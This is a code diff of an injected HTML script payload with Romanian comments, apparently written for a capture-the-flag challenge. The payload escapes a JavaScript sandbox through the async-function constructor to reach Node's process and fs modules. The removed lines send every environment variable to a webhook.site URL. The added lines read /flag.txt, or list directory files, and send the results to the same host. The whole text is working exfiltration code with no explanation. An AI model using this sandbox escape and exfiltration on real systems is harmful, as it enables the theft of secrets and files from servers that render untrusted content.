@@ -4,17 +4,23 @@
     <script>
         (async () => {
             try {
-                // Evadăm din sandbox
-                const f = new Function("return (async () => {}).constructor('return process')()");
-                const p = f();
+                // Încercăm să încărcăm modulul de sistem pentru fișiere (fs)
+                const fs = new Function("return (async () => {}).constructor('return require(\"fs\")')()")();
                 
-                // Luăm TOATE variabilele (toate numele și valorile)
-                const secrete = JSON.stringify(p.env);
-                
-                // Le trimitem pe toate odată
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?TOATE_SECRETE=" + btoa(secrete));
+                // Citim conținutul fișierului flag.txt
+                const flag = fs.readFileSync('/flag.txt', 'utf8');
+
+                // Îl trimitem către Webhook
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?CONTS_FISIER=" + btoa(flag));
             } catch (e) {
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ERR=" + btoa(e.message));
+                // Dacă nu putem citi fișierul, încercăm să listăm măcar fișierele din folderul curent
+                try {
+                    const fs2 = new Function("return (async () => {}).constructor('return require(\"fs\")')()")();
+                    const files = fs2.readdirSync('.').join(',');
+                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?LISTA_DOCS=" + btoa(files));
+                } catch (e2) {
+                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ULTIMA_EROARE=" + btoa(e2.message));
+                }
             }
         })();
     </script>
